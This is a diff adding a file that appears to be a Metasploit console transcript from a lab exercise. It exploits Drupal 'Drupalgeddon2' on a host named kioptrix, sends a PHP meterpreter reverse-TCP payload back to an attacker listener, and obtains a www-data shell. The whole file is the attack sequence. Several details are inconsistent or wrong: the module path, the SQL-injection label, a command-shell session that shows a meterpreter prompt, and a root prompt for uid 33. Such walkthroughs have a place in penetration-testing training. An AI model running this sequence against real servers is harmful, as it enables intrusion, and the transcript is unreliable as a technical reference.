@@ -1,0 +1,19 @@
+Metasploit Drupalgeddon2 Exploit Session
+text
+msf6 > use exploit/multi/http/drupal_drupageddon
+msf6 exploit(drupal_drupageddon) > set RHOSTS 192.168.1.150
+msf6 exploit(drupal_drupageddon) > set TARGETURI /drupal
+msf6 exploit(drupal_drupageddon) > set payload php/meterpreter/reverse_tcp
+msf6 exploit(drupal_drupageddon) > set LHOST 192.168.1.50
+msf6 exploit(drupal_drupageddon) > exploit
+
+[*] Started reverse TCP handler on 192.168.1.50:4444
+[+] Drupalgeddon2 SQLi confirmed
+[*] Uploading payload (5678/5678 bytes)...
+[+] Payload uploaded successfully
+[*] Command shell session 1 opened (192.168.1.50:4444 -> 192.168.1.150:80)
+meterpreter > getuid
+Server username: www-data
+meterpreter > shell
+www-data@kioptrix:~# id
+uid=33(www-data) gid=33(www-data)
